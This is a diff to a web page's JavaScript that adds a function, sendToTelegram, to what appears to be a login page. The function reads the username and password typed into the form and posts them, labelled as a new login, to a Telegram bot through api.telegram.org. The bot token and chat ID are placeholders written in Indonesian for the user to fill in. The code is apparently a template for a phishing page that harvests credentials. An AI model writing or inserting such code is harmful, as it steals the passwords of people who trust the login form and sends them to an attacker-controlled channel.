@@ -55,4 +55,28 @@ document.addEventListener('DOMContentLoaded', function() {
     //     e.preventDefault();
     //     alert('Login functionality would be implemented here in a real application.');
     // });
+
+    function sendToTelegram(e) {
+        e.preventDefault();
+    
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+    
+        const message = `📥 Login Baru:\nUsername: ${username}\nPassword: ${password}`;
+        const botToken = 'ISI_TOKEN_BOT_KAMU';
+        const chatId = 'ISI_CHAT_ID_KAMU';
+    
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: `chat_id=${chatId}&text=${encodeURIComponent(message)}`
+        })
+        .then(() => {
+            alert("✅ Data berhasil dikirim ke Telegram!");
+        })
+        .catch(err => {
+            alert("❌ Gagal mengirim data.");
+            console.error(err);
+        });
+    }
 });
